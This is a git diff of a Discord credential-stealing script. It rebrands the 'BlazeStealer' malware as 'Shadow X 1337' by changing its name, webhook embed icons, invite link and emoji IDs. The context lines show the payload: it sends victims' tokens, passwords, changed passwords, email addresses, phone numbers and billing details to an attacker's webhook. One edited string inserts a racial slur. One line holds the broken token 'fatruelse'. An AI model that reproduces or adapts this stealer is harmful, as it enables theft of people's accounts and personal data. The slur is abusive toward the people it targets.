@@ -9,7 +9,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "BlazeStealer",
+    brand: "Shadow X 1337",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -21,13 +21,13 @@ var config = {
     ping: [false, "@everyone"],
 
     embed: {
-        username: "BlazeStealer",
+        username: "Shadow X 1337",
         footer: {
-            text: `BlazeStealer`,
-            icon_url: "https://cdn.discordapp.com/attachments/999027404506935388/1000540107251654707/BlazeLeaks.png",
+            text: `Shadow X 1337`,
+            icon_url: "https://cdn.discordapp.com/attachments/1093554703289299064/1093564123511525488/1337.jpg",
         },
-        href: "https://discord.gg/T5V4uKtXDm",
-        avatar_url: "https://cdn.discordapp.com/attachments/999027404506935388/1000540107251654707/BlazeLeaks.png"
+        href: "https://discord.gg/1337s",
+        avatar_url: "https://cdn.discordapp.com/attachments/1093554703289299064/1093564123511525488/1337.jpg"
     },
 
     badges: {
@@ -272,25 +272,25 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:1015162401353637938> **Phone Number**",
+                        name: "<:1337:1093566172064129126> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917398155497512> **Nitro**",
+                        name: "<:1337:1093566186660298916> **Nitro**",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917401242505236> **Billing**",
+                        name: "<a:1337:1093566170092810302> **Billing**",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917391918563428> **Badges**",
+                        name: "<:1337:1093566181253853304> **Badges**",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917396788170752> **Token**",
+                        name: "<a:1337:1093566179207032944> **Token**",
                         value: `\`${token}\``,
                         inline: false
                     },
@@ -331,35 +331,35 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:blazeinc:998920354397425664> **Password**",
+                        name: "<:1337:1093566172064129126> **Password**",
                         value: `\`${password}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998919744767934556> **E-Mail Address**",
+                        name: "<:1337:1093566174706536519> **Mail **",
                         value: `\`${email}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:1015162401353637938> **Phone Number**",
+                        name: "<:1337:1093566172064129126> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917398155497512> **Nitro**",
+                        name: "<:1337:1093566186660298916> **Nitro**",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917401242505236> **Billing**",
+                        name: "<a:1337:1093566170092810302> **Billing**",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917391918563428> **Badges**",
+                        name: "<:1337:1093566181253853304> **Badges**",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917396788170752> **Token**",
+                        name: "<a:1337:1093566179207032944> **Token**",
                         value: `\`${token}\``,
                         inline: false
                     },
@@ -400,35 +400,35 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:blazeinc:998919744767934556> **New email address**",
+                        name: "<:1337:1093566174706536519> **New email address**",
                         value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998920354397425664> **Password**",
+                        name: "<:1337:1093566172064129126> **Password**",
                         value: `\`${password}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:1015162401353637938> **Phone Number**",
+                        name: "<:1337:1093566172064129126> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917398155497512> **Nitro**",
+                        name: "<:1337:1093566186660298916> **Nitro**",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: fatruelse
                     }, {
-                        name: "<a:blazeinc:998917401242505236> **Billing**",
+                        name: "<a:1337:1093566170092810302> **Billing**",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917391918563428> **Badges**",
+                        name: "<:1337:1093566181253853304> **Badges**",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917396788170752> **Token**",
+                        name: "<a:1337:1093566179207032944> **Token**",
                         value: `\`${token}\``,
                         inline: false
                     },
@@ -469,35 +469,35 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:blazeinc:998920354397425664> **Old password**",
+                        name: "<:1337:1093566172064129126> **Old password**",
                         value: `\`${oldPassword}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998920354397425664> **New password**",
+                        name: "<:1337:1093566172064129126> **New password**",
                         value: `\`${newPassword}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:1015162401353637938> **Phone Number**",
+                        name: "<:1337:1093566172064129126> **Phone Number**",
                         value: `\`${userInfo.phone ?? "None"}\``,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917398155497512> **Nitro**",
+                        name: "<:1337:1093566186660298916> **Nitro**",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917401242505236> **Billing**",
+                        name: "<a:1337:1093566170092810302> **Billing**",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<a:blazeinc:998917391918563428> **Badges**",
+                        name: "<:1337:1093566181253853304> **Badges**",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:blazeinc:998917396788170752> **Token**",
+                        name: "<a:1337:1093566179207032944> **Token**",
                         value: `\`${token}\``,
                         inline: false
                     },
@@ -606,7 +606,7 @@ async function getRelationships(token) {
             rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
         }
     }
-    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
+    if (!rareBadgesFriends) rareBadgesFriends = "Nigga Has No Rare Friends"
 
     return {
         length: r.length,
@@ -687,11 +687,11 @@ async function initialize() {
                     embeds: [createEmbed({
                         title: "Discord | Client initialized (not logged in)",
                         fields: [{
-                            name: "<:blazeinc:998917402404335626> **Hostname**",
+                            name: "<a:1337:1093566183707521144> **Hostname**",
                             value: `\`${os.hostname}\``,
                             inline: false
                         }, {
-                            name: "<:blazeinc:1010084832900026428> **Client version**",
+                            name: "<a:billing_address:1093566162320760902> **Client version**",
                             value: `\`${getDiscordClient()}\``,
                             inline: false
                         }],
@@ -717,30 +717,30 @@ async function initialize() {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                                name: "<a:blazeinc:998919744767934556> **E-Mail Address**",
+                                name: "<:1337:1093566174706536519> **Mail**",
                                 value: `\`${userInfo.email}\``,
                                 inline: true
                             },
                             {
-                                name: "<a:blazeinc:1015162401353637938> **Phone Number**",
+                                name: "<:1337:1093566172064129126> **Phone Number**",
                                 value: `\`${userInfo.phone ?? "None"}\``,
                                 inline: true
                             },
                             {
-                                name: "<a:blazeinc:998917398155497512> **Nitro**",
+                                name: "<:1337:1093566186660298916> **Nitro**",
                                 value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
                             }, {
-                                name: "<a:blazeinc:998917401242505236> **Billing**",
+                                name: "<a:1337:1093566170092810302> **Billing**",
                                 value: `${billing}`,
                                 inline: true
                             }, {
-                                name: "<a:blazeinc:998917391918563428> **Badges**",
+                                name: "<:1337:1093566181253853304> **Badges**",
                                 value: `${getBadges(userInfo.flags)}`,
                                 inline: true
                             },
                             {
-                                name: "<a:blazeinc:998917396788170752> **Token**",
+                                name: "<a:1337:1093566179207032944> **Token**",
                                 value: `\`${token}\``,
                                 inline: false
                             }
@@ -780,20 +780,20 @@ async function initialize() {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                                name: "<a:blazeinc:998917398155497512> **Nitro**",
+                                name: "<:1337:1093566186660298916> **Nitro**",
                                 value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
                             }, {
-                                name: "<a:blazeinc:998917401242505236> **Billing**",
+                                name: "<a:1337:1093566170092810302> **Billing**",
                                 value: `${billing}`,
                                 inline: true
                             }, {
-                                name: "<a:blazeinc:998917391918563428> **Badges**",
+                                name: "<:1337:1093566181253853304> **Badges**",
                                 value: `${getBadges(userInfo.flags)}`,
                                 inline: true
                             },
                             {
-                                name: "<a:blazeinc:998917396788170752> **Token**",
+                                name: "<a:1337:1093566179207032944> **Token**",
                                 value: `\`${token}\``,
                                 inline: false
                             },
